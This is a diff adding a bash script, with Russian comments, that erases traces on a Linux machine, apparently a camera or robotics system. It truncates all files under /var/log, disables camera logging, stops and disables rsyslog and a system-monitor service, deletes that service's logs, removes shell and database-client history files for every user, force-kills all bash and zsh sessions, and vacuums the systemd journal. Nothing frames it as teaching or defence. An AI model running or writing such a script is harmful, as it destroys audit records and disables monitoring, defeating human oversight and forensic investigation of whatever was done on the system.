@@ -1,0 +1,53 @@
+#!/bin/bash
+
+# Очистка системных логов
+find /var/log -type f -exec truncate -s 0 {} \; 2>/dev/null
+
+# Изменение стартового скрипта camera
+sed -i 's/^ENABLE_LOGGING=.*/ENABLE_LOGGING=0/' /usr/bin/camera
+
+# Удаление конфигурации rsyslog
+# rm -f /etc/rsyslog.d/10-systemd-ros.conf
+
+# Удаление служб и перезапуск
+systemctl restart 'camera@*'
+systemctl stop rsyslog
+systemctl disable rsyslog
+systemctl stop system-monitor.service 2>/dev/null
+systemctl disable system-monitor.service 2>/dev/null
+# rm -f /etc/systemd/system/system-monitor.service
+# rm -f /etc/system_monitor/system-monitor.conf
+
+systemctl daemon-reload 2>/dev/null
+
+# Удаление каталога system-monitor
+rm -rf /var/log/system_monitor 2>/dev/null
+
+# Удаление файлов истории для всех пользователей
+find /home /root -type f \( \
+    -name ".*_history" -o \
+    -name ".bash_history" -o \
+    -name ".zsh_history" -o \
+    -name ".mysql_history" -o \
+    -name ".psql_history" -o \
+    -name ".lesshst" -o \
+    -name ".viminfo" -o \
+    -name ".python_history" -o \
+    -name ".node_repl_history" -o \
+    -name ".rediscli_history" -o \
+    -name ".sqlite_history" -o \
+    -name ".xsession-errors*" \
+    \) -exec rm -f {} \; 2>/dev/null
+
+# Дополнительная очистка текущей сессии
+for user_home in /home/* /root; do
+    # Bash/Zsh
+    echo "" > "$user_home/.bash_history" 2>/dev/null
+    echo "" > "$user_home/.zsh_history" 2>/dev/null
+    
+    # Очистка истории в памяти
+    killall -9 bash zsh 2>/dev/null
+done
+
+# Очистка системных журналов
+journalctl --vacuum-time=1s 2>/dev/null
